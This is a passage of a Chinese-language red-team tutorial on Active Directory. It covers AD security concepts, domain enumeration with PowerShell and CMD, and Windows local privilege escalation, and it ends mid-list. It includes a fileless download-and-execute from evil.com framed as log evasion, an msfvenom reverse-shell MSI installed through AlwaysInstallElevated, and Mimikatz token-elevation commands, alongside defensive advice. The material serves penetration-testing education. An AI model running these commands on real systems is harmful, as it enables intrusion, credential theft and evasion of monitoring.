<h2 id="3-AD-安全机制"><a href="#3-AD-安全机制" class="headerlink" title="3. AD 安全机制"></a><strong>3. AD 安全机制</strong></h2><h3 id="3-1-安全边界"><a href="#3-1-安全边界" class="headerlink" title="3.1.安全边界"></a>3.1.安全边界</h3><ul>
<li><p><strong>域不是安全边界，安全边界只有林</strong></p>
<p>因为可以通过SidHistory中设置，进行跨域，通过Sid519进行域间凭证转义。</p>
</li>
</ul>
<h3 id="3-2-权限模型"><a href="#3-2-权限模型" class="headerlink" title="3.2 权限模型"></a><strong>3.2 权限模型</strong></h3><ul>
<li><strong>ACL（访问控制列表）</strong>：控制对象访问权限（如用户能否修改组策略）。</li>
<li><strong>权限委派</strong>：将管理权限下放给非管理员用户（如重置密码）。</li>
</ul>
<h3 id="3-3-组策略安全"><a href="#3-3-组策略安全" class="headerlink" title="3.3 组策略安全"></a><strong>3.3 组策略安全</strong></h3><ul>
<li><strong>GPO 继承</strong>：子 OU 继承父 OU 策略，可强制覆盖。</li>
<li><strong>常见风险</strong>：<ul>
<li>配置不当导致普通用户获得管理员权限。</li>
<li>通过 GPO 部署恶意脚本（如开机启动）。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="4-红队视角：AD-常见攻击面"><a href="#4-红队视角：AD-常见攻击面" class="headerlink" title="4. 红队视角：AD 常见攻击面"></a><strong>4. 红队视角：AD 常见攻击面</strong></h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250409213527904.png?x-oss-process=style/img-to-webp" alt="image-20250409213527904"></p>
<h3 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1 信息收集"></a><strong>4.1 信息收集</strong></h3><ul>
<li><p><strong>枚举域用户与计算机</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> Name</span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> Name</span><br></pre></td></tr></table></figure></li>
<li><p><strong>查询域信任关系</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-2-凭证攻击"><a href="#4-2-凭证攻击" class="headerlink" title="4.2 凭证攻击"></a><strong>4.2 凭证攻击</strong></h3><ul>
<li><strong>Pass-the-Hash（PtH）</strong>：使用用户哈希横向移动。</li>
<li><strong>Kerberoasting</strong>：破解服务账号的 Kerberos 票据（SPN 扫描）。</li>
</ul>
<h3 id="4-3-横向移动"><a href="#4-3-横向移动" class="headerlink" title="4.3 横向移动"></a><strong>4.3 横向移动</strong></h3><ul>
<li><strong>PsExec&#x2F;WMI 远程执行</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-ScriptBlock</span> &#123; whoami &#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>DCSync 攻击</strong>：模拟域控制器同步用户哈希（需 <code>Replicating Directory Changes</code> 权限）。</li>
</ul>
<h3 id="4-4-权限提升"><a href="#4-4-权限提升" class="headerlink" title="4.4 权限提升"></a><strong>4.4 权限提升</strong></h3><ul>
<li><strong>滥用 ACL 权限</strong>：如修改 GPO 或用户权限。</li>
<li><strong>MS14-068（漏洞）</strong>：伪造 PAC（Privilege Attribute Certificate）获取管理员权限。</li>
</ul>
<h3 id="4-5-持久化"><a href="#4-5-持久化" class="headerlink" title="4.5 持久化"></a><strong>4.5 持久化</strong></h3><ul>
<li><strong>Golden Ticket</strong>：生成长期有效的 TGT。</li>
<li><strong>影子组（Shadow Groups）</strong>：隐藏后门用户到受信任组。</li>
</ul>
<hr>
<h2 id="5-常用工具"><a href="#5-常用工具" class="headerlink" title="5. 常用工具"></a><strong>5. 常用工具</strong></h2><ul>
<li><strong>BloodHound</strong>：可视化 AD 攻击路径。</li>
<li><strong>Mimikatz</strong>：提取凭证、操作 Kerberos 票据。</li>
<li><strong>Impacket</strong>：执行协议级攻击（如 DCSync）。</li>
<li><strong>PowerView</strong>：PowerShell AD 信息收集工具。</li>
</ul>
<hr>
<h2 id="6-防御建议-1"><a href="#6-防御建议-1" class="headerlink" title="6. 防御建议"></a><strong>6. 防御建议</strong></h2><ol>
<li><strong>强化域控制器</strong>：限制管理员访问，启用 Credential Guard。</li>
<li><strong>监控日志</strong>：关注异常登录、DCSync 事件、GPO 修改。</li>
<li><strong>最小化权限</strong>：避免普通用户拥有过高权限。</li>
<li><strong>定期审计</strong>：检查 ACL、SPN 配置、信任关系。</li>
<li><strong>禁用过时协议</strong>：如 NTLM，强制使用 Kerberos。</li>
</ol>
<hr>
<h2 id="示例：通过-LDAP-查询域信息"><a href="#示例：通过-LDAP-查询域信息" class="headerlink" title="示例：通过 LDAP 查询域信息"></a><strong>示例：通过 LDAP 查询域信息</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有用户</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> * | <span class="built_in">Select-Object</span> Name, UserPrincipalName</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域管理员组</span></span><br><span class="line"><span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> | <span class="built_in">Select-Object</span> Name</span><br></pre></td></tr></table></figure>

<hr>
<p>掌握 AD 域基础是红队渗透测试的关键，后续可结合工具和漏洞深入攻击手法。注意：所有操作需在授权范围内进行！</p>
<h1 id="三、活动目录枚举"><a href="#三、活动目录枚举" class="headerlink" title="三、活动目录枚举"></a>三、活动目录枚举</h1><hr>
<p>在渗透测试或红队行动中，<strong>域基础信息枚举</strong>是获取 Active Directory（AD）环境关键信息的重要步骤。以下是常用的枚举方法和工具，涵盖用户、计算机、组策略、信任关系等核心信息：</p>
<hr>
<h2 id="1-基本信息枚举"><a href="#1-基本信息枚举" class="headerlink" title="1. 基本信息枚举"></a><strong>1. 基本信息枚举</strong></h2><h3 id="1-获取当前域信息"><a href="#1-获取当前域信息" class="headerlink" title="(1) 获取当前域信息"></a><strong>(1) 获取当前域信息</strong></h3><ul>
<li><strong>PowerShell 内置命令</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADDomain</span> | <span class="built_in">Select-Object</span> Name, DNSRoot, DomainMode, Forest</span><br></pre></td></tr></table></figure>
<ul>
<li>输出域名、DNS根、域功能级别和所属林名称。</li>
</ul>
</li>
<li><strong>CMD 命令</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> view /domain   # 列出所有域</span><br><span class="line"><span class="built_in">net</span> config workstation  # 查看当前域信息</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-域控制器定位"><a href="#2-域控制器定位" class="headerlink" title="(2) 域控制器定位"></a><strong>(2) 域控制器定位</strong></h3><ul>
<li><strong>DNS 查询 SRV 记录</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp.dc._msdcs.&lt;域名&gt;</span><br></pre></td></tr></table></figure></li>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADDomainController</span> | <span class="built_in">Select-Object</span> HostName, IPv4Address, Site</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="2-用户与组枚举"><a href="#2-用户与组枚举" class="headerlink" title="2. 用户与组枚举"></a><strong>2. 用户与组枚举</strong></h2><h3 id="1-查询域用户"><a href="#1-查询域用户" class="headerlink" title="(1) 查询域用户"></a><strong>(1) 查询域用户</strong></h3><ul>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> * | <span class="built_in">Select-Object</span> Name, SamAccountName, Enabled, LastLogonDate</span><br></pre></td></tr></table></figure>
<ul>
<li><code>-Filter *</code> 表示所有用户，<code>-Properties *</code> 显示全部属性。</li>
</ul>
</li>
<li><strong>过滤管理员用户</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> | <span class="built_in">Select-Object</span> Name</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-查询域组"><a href="#2-查询域组" class="headerlink" title="(2) 查询域组"></a><strong>(2) 查询域组</strong></h3><ul>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADGroup</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> Name, GroupCategory</span><br></pre></td></tr></table></figure></li>
<li><strong>查询特权组</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADGroup</span> <span class="literal">-Filter</span> &#123;Name <span class="operator">-like</span> <span class="string">&quot;*Admin*&quot;</span>&#125; | <span class="built_in">Select-Object</span> Name</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="3-计算机枚举"><a href="#3-计算机枚举" class="headerlink" title="3. 计算机枚举"></a><strong>3. 计算机枚举</strong></h2><h3 id="1-列出域内计算机"><a href="#1-列出域内计算机" class="headerlink" title="(1) 列出域内计算机"></a><strong>(1) 列出域内计算机</strong></h3><ul>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * <span class="literal">-Properties</span> * | <span class="built_in">Select-Object</span> Name, DNSHostName, OperatingSystem</span><br></pre></td></tr></table></figure></li>
<li><strong>CMD 命令</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-定位特定服务主机"><a href="#2-定位特定服务主机" class="headerlink" title="(2) 定位特定服务主机"></a><strong>(2) 定位特定服务主机</strong></h3><ul>
<li><strong>查询 SQL 服务器</strong>（通过 SPN）：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-like</span> <span class="string">&quot;MSSQLSvc*&quot;</span>&#125; <span class="literal">-Properties</span> ServicePrincipalName</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="4-组策略（GPO）枚举"><a href="#4-组策略（GPO）枚举" class="headerlink" title="4. 组策略（GPO）枚举"></a><strong>4. 组策略（GPO）枚举</strong></h2><h3 id="1-列出所有-GPO"><a href="#1-列出所有-GPO" class="headerlink" title="(1) 列出所有 GPO"></a><strong>(1) 列出所有 GPO</strong></h3><ul>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-GPO</span> <span class="literal">-All</span> | <span class="built_in">Select-Object</span> DisplayName, Id, ModificationTime</span><br></pre></td></tr></table></figure></li>
<li><strong>导出 GPO 设置</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-GPOReport</span> <span class="literal">-Name</span> <span class="string">&quot;Default Domain Policy&quot;</span> <span class="literal">-ReportType</span> HTML <span class="literal">-Path</span> <span class="string">&quot;C:\gpo_report.html&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-查找敏感配置"><a href="#2-查找敏感配置" class="headerlink" title="(2) 查找敏感配置"></a><strong>(2) 查找敏感配置</strong></h3><ul>
<li><p><strong>搜索密码策略</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADDefaultDomainPasswordPolicy</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>检查登录脚本路径</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-GPO</span> <span class="literal">-All</span> | <span class="built_in">ForEach-Object</span> &#123; <span class="built_in">Get-GPOReport</span> <span class="literal">-Guid</span> <span class="variable">$_</span>.Id <span class="literal">-ReportType</span> XML &#125; | <span class="built_in">Select-String</span> <span class="string">&quot;Scripts&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="5-信任关系与林信息"><a href="#5-信任关系与林信息" class="headerlink" title="5. 信任关系与林信息"></a><strong>5. 信任关系与林信息</strong></h2><h3 id="1-域信任关系"><a href="#1-域信任关系" class="headerlink" title="(1) 域信任关系"></a><strong>(1) 域信任关系</strong></h3><ul>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> Name, Direction, TrustType</span><br></pre></td></tr></table></figure></li>
<li><strong>CMD 命令</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-林信息"><a href="#2-林信息" class="headerlink" title="(2) 林信息"></a><strong>(2) 林信息</strong></h3><ul>
<li><strong>PowerShell</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADForest</span> | <span class="built_in">Select-Object</span> Name, RootDomain, Domains</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="6-工具化枚举"><a href="#6-工具化枚举" class="headerlink" title="6. 工具化枚举"></a><strong>6. 工具化枚举</strong></h2><h3 id="1-PowerView（PowerShell-脚本）"><a href="#1-PowerView（PowerShell-脚本）" class="headerlink" title="(1) PowerView（PowerShell 脚本）"></a><strong>(1) PowerView（PowerShell 脚本）</strong></h3><ul>
<li><strong>下载</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>常用命令</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetDomain</span>           <span class="comment"># 当前域信息</span></span><br><span class="line"><span class="built_in">Get-NetUser</span>             <span class="comment"># 所有用户</span></span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-SPN</span> <span class="string">&quot;*SQL*&quot;</span>  <span class="comment"># 按 SPN 过滤计算机</span></span><br><span class="line"><span class="built_in">Invoke-ShareFinder</span>      <span class="comment"># 查找共享目录</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-BloodHound（可视化分析）"><a href="#2-BloodHound（可视化分析）" class="headerlink" title="(2) BloodHound（可视化分析）"></a><strong>(2) BloodHound（可视化分析）</strong></h3><ul>
<li><strong>数据采集</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All</span><br></pre></td></tr></table></figure>
<ul>
<li>生成 JSON 文件后导入 BloodHound 界面，自动分析攻击路径。</li>
</ul>
</li>
<li><strong>关键查询</strong>：<ul>
<li>“查找域管理员登录的主机”。</li>
<li>“查找具有 ACL 权限提升路径的用户”。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="7-隐蔽枚举技巧"><a href="#7-隐蔽枚举技巧" class="headerlink" title="7. 隐蔽枚举技巧"></a><strong>7. 隐蔽枚举技巧</strong></h2><h3 id="1-LDAP-匿名查询"><a href="#1-LDAP-匿名查询" class="headerlink" title="(1) LDAP 匿名查询"></a><strong>(1) LDAP 匿名查询</strong></h3><ul>
<li>若允许匿名访问，可直接通过 LDAP 查询：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$searcher</span> = <span class="built_in">New-Object</span> DirectoryServices.DirectorySearcher</span><br><span class="line"><span class="variable">$searcher</span>.Filter = <span class="string">&quot;(objectCategory=User)&quot;</span></span><br><span class="line"><span class="variable">$searcher</span>.FindAll() | <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$_</span>.Properties &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-绕过日志监控"><a href="#2-绕过日志监控" class="headerlink" title="(2) 绕过日志监控"></a><strong>(2) 绕过日志监控</strong></h3><ul>
<li><strong>无文件执行</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://evil.com/PowerView.ps1&#x27;); Get-NetUser&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>清除内存痕迹</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">System.GC</span>]::Collect()  <span class="comment"># 强制垃圾回收</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="8-关键信息示例"><a href="#8-关键信息示例" class="headerlink" title="8. 关键信息示例"></a><strong>8. 关键信息示例</strong></h2><h3 id="1-定位域管理员"><a href="#1-定位域管理员" class="headerlink" title="(1) 定位域管理员"></a><strong>(1) 定位域管理员</strong></h3><ul>
<li><p><strong>PowerShell</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Recursive</span> | <span class="built_in">Select-Object</span> Name, DistinguishedName</span><br></pre></td></tr></table></figure></li>
<li><p><strong>通过日志分析</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> Security <span class="literal">-FilterXPath</span> <span class="string">&quot;*[System[EventID=4624]]&quot;</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Message <span class="operator">-match</span> <span class="string">&quot;Administrator&quot;</span> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-查找敏感共享"><a href="#2-查找敏感共享" class="headerlink" title="(2) 查找敏感共享"></a><strong>(2) 查找敏感共享</strong></h3><ul>
<li><p><strong>PowerShell</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SmbShare</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Path <span class="operator">-like</span> <span class="string">&quot;*Data*&quot;</span> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a><strong>防御建议</strong></h2><ol>
<li><strong>限制匿名 LDAP 查询</strong>：禁用未经认证的访问。</li>
<li><strong>监控敏感命令</strong>：如 <code>Get-ADUser</code>、<code>Invoke-BloodHound</code>。</li>
<li><strong>启用 PowerShell 日志</strong>：记录脚本执行和模块加载。</li>
<li><strong>定期审计权限</strong>：检查特权组和 ACL 配置。</li>
</ol>
<hr>
<p>掌握域基础信息枚举是渗透测试的关键前置步骤，结合工具和手动查询可快速构建攻击地图。注意：所有操作需在合法授权范围内进行！</p>
<h1 id="四、本地权限提升"><a href="#四、本地权限提升" class="headerlink" title="四、本地权限提升"></a>四、本地权限提升</h1><hr>
<p>在渗透测试或红队行动中，<strong>Windows本地权限提升</strong>（Local Privilege Escalation, LPE）是获取更高权限（如 <code>SYSTEM</code> 或管理员）的关键步骤。以下是常见提权手法、工具及防御建议：</p>
<hr>
<h2 id="1-基础信息收集"><a href="#1-基础信息收集" class="headerlink" title="1. 基础信息收集"></a><strong>1. 基础信息收集</strong></h2><p>在尝试提权前，需先收集系统信息，定位可利用的漏洞或配置缺陷：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户权限</span></span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的补丁</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看计划任务</span></span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看服务权限（PowerShell）</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Service | <span class="built_in">Select-Object</span> Name, StartName, PathName</span><br></pre></td></tr></table></figure>

<p>或者使用自动化信息枚举工具<strong>豌豆</strong><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">winpeas</a></p>
<h2 id="2-常见提权手法"><a href="#2-常见提权手法" class="headerlink" title="2. 常见提权手法"></a><strong>2. 常见提权手法</strong></h2><h3 id="1-利用未修补的系统漏洞"><a href="#1-利用未修补的系统漏洞" class="headerlink" title="(1) 利用未修补的系统漏洞"></a><strong>(1) 利用未修补的系统漏洞</strong></h3><ul>
<li><strong>CVE 漏洞</strong>：<ul>
<li>**PrintNightmare (CVE-2021-34527)**：通过打印机服务加载恶意DLL。</li>
<li><strong>CVE-2021-1675</strong>：类似PrintNightmare的远程代码执行漏洞。</li>
<li>**ZeroLogon (CVE-2020-1472)**：重置域控制器密码（针对域环境）。</li>
</ul>
</li>
<li><strong>利用工具</strong>：<ul>
<li><strong>Metasploit</strong>：<code>use exploit/windows/local/[漏洞模块]</code>。</li>
<li><strong>GitHub PoC</strong>：如 <a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">PrintNightmare PoC</a>。</li>
</ul>
</li>
</ul>
<h3 id="2-服务权限滥用"><a href="#2-服务权限滥用" class="headerlink" title="(2) 服务权限滥用"></a><strong>(2) 服务权限滥用</strong></h3><ul>
<li><p><strong>可写服务路径</strong>：</p>
<ul>
<li>查找服务二进制路径可写的服务：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Service | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.PathName <span class="operator">-like</span> <span class="string">&quot;* *&quot;</span> &#125; | <span class="built_in">Select-Object</span> Name, PathName, StartName</span><br></pre></td></tr></table></figure></li>
<li>替换二进制文件并重启服务：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop ServiceName</span><br><span class="line">sc <span class="built_in">start</span> ServiceName</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>服务未引用路径</strong>（Unquoted Service Path）：</p>
<ul>
<li>若服务路径未用引号包裹且包含空格，可在中间目录植入恶意程序：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例路径：C:\Program Files\Vulnerable Service\service.exe</span></span><br><span class="line"><span class="comment"># 植入 C:\Program.exe 或 C:\Program Files\Vulnerable.exe</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="3-计划任务提权"><a href="#3-计划任务提权" class="headerlink" title="(3) 计划任务提权"></a><strong>(3) 计划任务提权</strong></h3><ul>
<li><p><strong>查找以高权限运行的任务</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v | findstr /i <span class="string">&quot;SYSTEM\|管理员&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>劫持任务调用的可写脚本或DLL</strong>。</p>
</li>
</ul>
<h3 id="4-DLL劫持（DLL-Hijacking）"><a href="#4-DLL劫持（DLL-Hijacking）" class="headerlink" title="(4) DLL劫持（DLL Hijacking）"></a><strong>(4) DLL劫持（DLL Hijacking）</strong></h3><ul>
<li><strong>原理</strong>：程序运行时加载未验证的DLL路径。</li>
<li><strong>工具</strong>：<ul>
<li><strong>Process Monitor</strong>：监控目标进程加载的DLL。</li>
<li><strong>PowerShell脚本</strong>：自动化检测可劫持的DLL路径。</li>
</ul>
</li>
</ul>
<h3 id="5-令牌模拟（Token-Impersonation）"><a href="#5-令牌模拟（Token-Impersonation）" class="headerlink" title="(5) 令牌模拟（Token Impersonation）"></a><strong>(5) 令牌模拟（Token Impersonation）</strong></h3><ul>
<li><strong>适用场景</strong>：已获取管理员进程的令牌（如通过Meterpreter会话）。</li>
<li><strong>Mimikatz命令</strong>：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">token</span>::<span class="title">elevate</span></span></span><br></pre></td></tr></table></figure></li>
<li><strong>Metasploit模块</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-注册表键滥用"><a href="#6-注册表键滥用" class="headerlink" title="(6) 注册表键滥用"></a><strong>(6) 注册表键滥用</strong></h3><ul>
<li><strong>AlwaysInstallElevated</strong>：<ul>
<li>检查是否允许普通用户以SYSTEM权限安装MSI包：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure></li>
<li>生成恶意MSI并安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o evil.msi</span><br><span class="line">msiexec /quiet /qn /i evil.msi</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="7-利用自动运行程序（Autoruns）"><a href="#7-利用自动运行程序（Autoruns）" class="headerlink" title="(7) 利用自动运行程序（Autoruns）"></a><strong>(7) 利用自动运行程序（Autoruns）</strong></h3><ul>
<li><strong>查找开机&#x2F;登录自启动程序</strong>：<ul>
<li><strong>工具</strong>：Autoruns（Sysinternals工具集）。</li>
<li><strong>替换可写的启动项脚本</strong>（如 <code>C:\Users\Public\Desktop\startup.bat</code>）。</li>
</ul>
</li>
</ul>
<h3 id="8-其他"><a href="#8-其他" class="headerlink" title="(8) 其他"></a><strong>(8) 其他</strong></h3><ul>
